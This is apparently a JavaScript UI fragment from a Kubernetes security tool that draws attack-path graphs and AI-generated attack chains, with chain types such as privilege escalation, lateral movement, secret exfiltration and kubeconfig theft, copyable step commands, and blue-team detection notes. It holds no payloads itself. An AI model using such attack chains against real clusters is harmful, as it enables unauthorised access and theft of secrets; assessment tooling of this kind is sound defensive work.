        badge.setAttribute('stroke', '#ff79c6'); badge.setAttribute('stroke-width', '1');
        g.appendChild(badge);
        const badgeTxt = document.createElementNS(NS, 'text');
        badgeTxt.setAttribute('x', nodeR - 5); badgeTxt.setAttribute('y', -nodeR + 9);
        badgeTxt.setAttribute('text-anchor', 'middle'); badgeTxt.setAttribute('font-size', '6');
        badgeTxt.setAttribute('fill', '#ff79c6'); badgeTxt.setAttribute('font-family', 'system-ui,sans-serif');
        badgeTxt.textContent = '⛓';
        g.appendChild(badgeTxt);
      }

      const icon = document.createElementNS(NS, 'text');
      icon.setAttribute('text-anchor', 'middle'); icon.setAttribute('dominant-baseline', 'middle');
      icon.setAttribute('font-size', '10'); icon.setAttribute('fill', '#fff');
      icon.setAttribute('font-family', 'system-ui,sans-serif');
      icon.textContent = NODE_ICONS[n.kind] || '?';
      g.appendChild(icon);

      const nm  = (n.name || n.id || '');
      const nlbl = document.createElementNS(NS, 'text');
      nlbl.setAttribute('text-anchor', 'middle'); nlbl.setAttribute('y', nodeR + 12);
      nlbl.setAttribute('font-size', '8'); nlbl.setAttribute('fill', stroke);
      nlbl.setAttribute('font-weight', (isFirst || isLast) ? '600' : '400');
      nlbl.setAttribute('font-family', 'system-ui,sans-serif');
      nlbl.textContent = nm.length > 13 ? nm.slice(0, 11) + '…' : nm;
      g.appendChild(nlbl);

      if (isFirst || isLast) {
        const tag = document.createElementNS(NS, 'text');
        tag.setAttribute('text-anchor', 'middle'); tag.setAttribute('y', nodeR + 22);
        tag.setAttribute('font-size', '7'); tag.setAttribute('fill', stroke);
        tag.setAttribute('opacity', '.55'); tag.setAttribute('font-family', 'system-ui,sans-serif');
        tag.textContent = isFirst ? 'START' : 'TARGET';
        g.appendChild(tag);
      }

      svg.appendChild(g);
    });
  });

  // ── shared-node cross-lane connectors ─────────────────────────────────────
  // For nodes that appear in multiple lanes, draw a faint dashed vertical line
  Object.values(nodePositions).forEach(positions => {
    if (positions.length < 2) return;
    for (let i = 0; i < positions.length - 1; i++) {
      const a = positions[i], b = positions[i + 1];
      // Only connect vertically if x positions are close (same logical column)
      if (Math.abs(a.x - b.x) > spacing * 0.6) continue;
      const cx = (a.x + b.x) / 2;
      const conn = document.createElementNS(NS, 'line');
      conn.setAttribute('x1', cx); conn.setAttribute('x2', cx);
      conn.setAttribute('y1', a.cy + nodeR + 1); conn.setAttribute('y2', b.cy - nodeR - 1);
      conn.setAttribute('stroke', 'rgba(162,155,254,.35)');
      conn.setAttribute('stroke-width', '1.5');
      conn.setAttribute('stroke-dasharray', '3 4');
      svg.insertBefore(conn, svg.firstChild); // render behind nodes
    }
  });

  svgWrap.appendChild(svg);
  wrap.appendChild(header);
  wrap.appendChild(svgWrap);
  containerEl.appendChild(wrap);

  requestAnimationFrame(() => requestAnimationFrame(() => wrap.classList.add('visible')));
}

function renderAIChainBlock(chain, saNode, model, hasPivotData) {
  const body = document.getElementById('god-body');
  const sevColors = { CRITICAL:'#ff4757', HIGH:'#ff9f43', MEDIUM:'#ffd166', LOW:'#06d6a0' };
  const sevBg     = { CRITICAL:'#2e0000', HIGH:'#2e1000', MEDIUM:'#2e2000', LOW:'#002e18' };
  const chainTypeColors = {
    MULTI_HOP_PIVOT: '#ff79c6', DIRECT_PRIVESC: '#ff4757',
    LATERAL_MOVE: '#4cc9f0', SECRET_EXFIL: '#ffd166',
    KUBECONFIG_THEFT: '#f9ca24', ESCALATE_BIND: '#e84393', LIMITED: '#8b909a',
  };
  const chainTypeLabels = {
    MULTI_HOP_PIVOT: '⛓ CHAIN PIVOT', DIRECT_PRIVESC: '▲ PRIV ESC',
    LATERAL_MOVE: '→ LATERAL', SECRET_EXFIL: '⬇ EXFIL',
    KUBECONFIG_THEFT: '⚡ KUBECONFIG', ESCALATE_BIND: '★ ESCALATE+BIND', LIMITED: '— LIMITED',
  };
  const sev = (chain.severity||'HIGH').toUpperCase();
  const ct  = (chain.chain_type||'').toUpperCase();

  const block = document.createElement('div');
  block.className = 'god-ai-block expanded';

  const pivotBadge = ct === 'MULTI_HOP_PIVOT'
    ? `<span style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;background:#2a0033;color:#ff79c6;border:1px solid #ff79c640;margin-left:4px">${chainTypeLabels[ct]||ct}</span>`
    : (ct && ct !== 'LIMITED' ? `<span style="font-size:10px;padding:2px 7px;border-radius:4px;background:#1a1a2e;color:${chainTypeColors[ct]||'#aaa'};border:1px solid ${chainTypeColors[ct]||'#aaa'}30;margin-left:4px">${chainTypeLabels[ct]||ct}</span>` : '');

  block.innerHTML = `
    <div class="god-ai-block-header" onclick="this.closest('.god-ai-block').classList.toggle('expanded')">
      <span class="god-ai-badge">🤖 AI · ${escHtml(model)}</span>
      <div class="god-ai-title">${escHtml(chain.chain_title||'AI Attack Chain')}</div>
      <span style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;background:${sevBg[sev]||'#111'};color:${sevColors[sev]||'#fff'};border:1px solid ${sevColors[sev]||'#fff'}40">${escHtml(sev)}</span>
      ${pivotBadge}
      <span style="font-size:11px;color:var(--muted);margin-left:4px">${chain.steps.length} steps</span>
      <span class="god-chain-toggle">▾</span>
      <button class="play-chain-btn" title="Animate attack chain on graph" onclick="event.stopPropagation();playAttackChain(this.closest('.god-ai-block'));" style="background:#0d2a1a;border:1px solid #06d6a050;color:#06d6a0;border-radius:4px;padding:2px 8px;font-size:10px;cursor:pointer;font-family:inherit;margin-left:4px">▶ Play</button>
    </div>
    <div class="god-ai-block-body"></div>`;

  const bodyEl = block.querySelector('.god-ai-block-body');

  if (chain.summary) {
    const sumEl = document.createElement('div');
    sumEl.className = 'god-ai-summary';
    sumEl.textContent = chain.summary;
    bodyEl.appendChild(sumEl);
  }

  // Pivot identity chain visualization
  if (chain.pivot_identities?.length) {
    const pivotEl = document.createElement('div');
    pivotEl.style.cssText = 'margin:8px 12px 4px;padding:7px 10px;background:#1a0a2e;border:1px solid #ff79c630;border-radius:6px;font-size:11px;';
    const chips = [escHtml(saNode.name||saNode.id), ...chain.pivot_identities.map(p => escHtml(p))]
      .map((name, i) => `<span style="padding:2px 8px;border-radius:10px;background:${i===0?'#1a2a36':i===chain.pivot_identities.length?'#3a0000':'#2a0033'};color:${i===0?'var(--accent)':i===chain.pivot_identities.length?'var(--crit)':'#ff79c6'};font-weight:600">${name}</span>`)
      .join('<span style="color:#ff79c6;margin:0 3px">→</span>');
    pivotEl.innerHTML = `<div style="color:#ff79c6;font-size:10px;font-weight:700;margin-bottom:5px;letter-spacing:.05em">PIVOT CHAIN</div><div style="display:flex;flex-wrap:wrap;align-items:center;gap:3px">${chips}</div>`;
    bodyEl.appendChild(pivotEl);
  }

  // Primary steps
  chain.steps.forEach((step, i) => {
    const col = PHASE_COLORS[step.phase] || 'var(--muted)';
    const cmdText = (step.cmd || '').trim();
    const cmdEncoded = encodeURIComponent(cmdText);
    const identityTag = step.identity_at_step
      ? `<div style="font-size:10px;color:#a29bfe;margin-bottom:3px;font-family:monospace">@ ${escHtml(step.identity_at_step)}</div>`
      : '';

    const stepEl = document.createElement('div');
    stepEl.className = 'god-step ai-step' + (i === 0 || i === chain.steps.length - 1 ? ' active-step' : '');
    stepEl.innerHTML = `
      <div class="god-step-num" style="border-color:${col};color:${col}">${i+1}</div>
      <div class="god-step-body">
        <div class="god-step-phase" style="color:${col}">${escHtml(step.phase||'')}</div>
        ${identityTag}
        <div class="god-step-action">${escHtml(step.action||'')}</div>
        <div class="god-step-desc">${escHtml(step.desc||'')}</div>
        ${cmdText ? `<div class="god-step-cmd">${escHtml(cmdText)}<button class="god-copy" onclick="copyCmd(this)" data-cmd="${cmdEncoded}">⧉</button></div>` : ''}
      </div>`;
    bodyEl.appendChild(stepEl);

    if (i < chain.steps.length - 1) {
      const div = document.createElement('div');
      div.className = 'god-divider';
      bodyEl.appendChild(div);
    }
  });

  // Alternative escalation chains
  if (chain.escalation_chains?.length) {
    const altHeader = document.createElement('div');
    altHeader.style.cssText = 'margin:12px 12px 4px;font-size:10px;font-weight:700;color:var(--muted);letter-spacing:.06em;text-transform:uppercase';
    altHeader.textContent = `Alternative Attack Paths (${chain.escalation_chains.length})`;
    bodyEl.appendChild(altHeader);

    chain.escalation_chains.forEach(alt => {
      const altSev = (alt.severity||'MEDIUM').toUpperCase();
      const altEl = document.createElement('div');
      altEl.style.cssText = 'margin:4px 12px;padding:8px 10px;background:var(--surface3);border:1px solid var(--border);border-radius:6px;font-size:11px;';
      const hopLines = (alt.hops||[]).map((h, i) =>
        `<div style="display:flex;gap:6px;align-items:baseline;margin-top:${i?3:0}px"><span style="color:var(--muted);font-size:10px;min-width:14px">${i+1}.</span><span>${escHtml(h)}</span></div>`
      ).join('');
      altEl.innerHTML = `
        <div style="display:flex;align-items:center;gap:6px;margin-bottom:5px">
          <span style="font-weight:600;color:var(--text)">${escHtml(alt.title||'Alt Chain')}</span>
          <span style="font-size:10px;padding:1px 6px;border-radius:3px;background:${sevBg[altSev]||'#111'};color:${sevColors[altSev]||'#fff'}">${altSev}</span>
        </div>
        ${hopLines}
        ${alt.final_impact ? `<div style="margin-top:5px;color:var(--crit);font-size:10px;font-style:italic">Impact: ${escHtml(alt.final_impact)}</div>` : ''}`;
      bodyEl.appendChild(altEl);
    });
  }

  // Detection notes
  if (chain.detection_notes?.length) {
    const detHeader = document.createElement('div');
    detHeader.style.cssText = 'margin:12px 12px 4px;font-size:10px;font-weight:700;color:var(--low);letter-spacing:.06em;text-transform:uppercase';
    detHeader.textContent = 'Blue Team Detection';
    bodyEl.appendChild(detHeader);

    const detEl = document.createElement('div');
    detEl.style.cssText = 'margin:0 12px 10px;padding:8px 10px;background:#002e1810;border:1px solid var(--low)20;border-radius:6px;font-size:11px;';
    detEl.innerHTML = chain.detection_notes.map(n =>
      `<div style="color:var(--low);margin-bottom:3px;font-family:monospace;font-size:10px">▸ ${escHtml(n)}</div>`
    ).join('');
    bodyEl.appendChild(detEl);
  }

  // Render attack path mini graph below AI steps
  renderAttackPathMiniGraph(saNode, bodyEl);

  // Insert AI block at top, before existing graph chains
  body.insertBefore(block, body.firstChild);
}

// Attack chain playback
function playAttackChain(blockEl) {
  if (playbackTimer) { clearTimeout(playbackTimer); playbackTimer = null; }
  const steps = [...blockEl.querySelectorAll('.ai-step')];
  const playBtn = blockEl.querySelector('.play-chain-btn');
  if (!steps.length) return;

  // Create step overlay
  let overlay = document.getElementById('playback-overlay');
  if (!overlay) {
    overlay = document.createElement('div');
    overlay.id = 'playback-overlay';
    overlay.style.cssText = 'position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#0a0b10ee;border:1px solid var(--accent);border-radius:8px;padding:8px 16px;font-size:12px;color:var(--accent);z-index:99;display:flex;align-items:center;gap:10px';
    document.body.appendChild(overlay);
  }

  let i = 0;
  if (playBtn) { playBtn.textContent = '⏹ Stop'; playBtn.onclick = (ev) => { ev.stopPropagation(); stopPlayback(); }; }

  function stopPlayback() {
    if (playbackTimer) { clearTimeout(playbackTimer); playbackTimer = null; }
    const ov = document.getElementById('playback-overlay');
    if (ov) ov.remove();
    if (playBtn) { playBtn.textContent = '▶ Play'; playBtn.onclick = (ev) => { ev.stopPropagation(); playAttackChain(blockEl); }; }
    // Reset node highlighting
    if (nodesLayer) nodesLayer.selectAll('circle.node-circle').classed('path-active', false).classed('highlighted', false).classed('dimmed', false);
    if (linksLayer) linksLayer.selectAll('path.edge-path').classed('dimmed', false).classed('path-active', false);
  }

  function advanceStep() {
    if (i >= steps.length) { setTimeout(stopPlayback, 1500); return; }
    const stepEl = steps[i];
    const action = stepEl.querySelector('.god-step-action')?.textContent || '';
    const cmdEl  = stepEl.querySelector('.god-step-cmd');
    const cmd    = cmdEl?.textContent?.replace('⧉','').trim() || '';
    const ov = document.getElementById('playback-overlay');
    if (ov) ov.innerHTML = `<span style="color:var(--muted);font-size:10px">Step ${i+1}/${steps.length}</span> <span>${escHtml(action)}</span> <button onclick="window.stopPlayback&&window.stopPlayback()" style="background:none;border:none;color:var(--muted);cursor:pointer;font-size:12px">✕</button>`;
    // Scroll step into view
    stepEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    stepEl.style.outline = '1px solid var(--accent)';
    if (i > 0) { steps[i-1].style.outline = ''; }
    // Try to find + highlight matching graph nodes from cmd text
    if (cmd && nodesLayer) {
      const podMatch = cmd.match(/(?:pod\/|exec\s+)([a-z0-9][a-z0-9\-\.]+)/i);
      if (podMatch) {
        const nameHint = podMatch[1];
        nodesLayer.selectAll('circle.node-circle')
          .classed('path-active', d => (d.name||'').includes(nameHint))
          .classed('highlighted', d => (d.name||'').includes(nameHint))
          .classed('dimmed', d => !(d.name||'').includes(nameHint));
      }
    }
    i++;
    playbackTimer = setTimeout(advanceStep, 2500);
  }

  window.stopPlayback = stopPlayback;
  advanceStep();
}

// AI toggle + generate button wiring
document.getElementById('god-ai-toggle').addEventListener('click', () => {
  const btn      = document.getElementById('god-ai-toggle');
  const settings = document.getElementById('god-ai-settings');
  const isOn     = btn.classList.toggle('active');
  if (isOn) {
    settings.classList.add('visible');
    const saved = localStorage.getItem('k8scout-openai-key');
    if (saved) document.getElementById('god-ai-key').value = saved;
    const saId = document.getElementById('god-sa-select').value;
    document.getElementById('god-ai-generate').disabled = saId === '__all__';
    document.getElementById('god-ai-status').textContent = saId === '__all__' ? 'Select a specific SA' : 'Ready';
  } else {
    settings.classList.remove('visible');
    setAIStatus('', '');
  }
});

document.getElementById('god-ai-generate').addEventListener('click', () => {
  const saId = document.getElementById('god-sa-select').value;
  generateAIChain(saId);
});

document.getElementById('god-blueteam-btn').addEventListener('click', () => {
  blueTeamMode = !blueTeamMode;
  const btn = document.getElementById('god-blueteam-btn');
  btn.style.background = blueTeamMode ? '#002e1850' : 'none';
  btn.style.borderColor = blueTeamMode ? '#06d6a0' : '#06d6a050';
  btn.textContent = blueTeamMode ? '🛡 Blue Team ON' : '🛡 Blue Team';
});

document.getElementById('god-compare-btn').addEventListener('click', () => {
  const apiKey = document.getElementById('god-ai-key').value.trim();
  generateMultiSAComparison(apiKey);
});

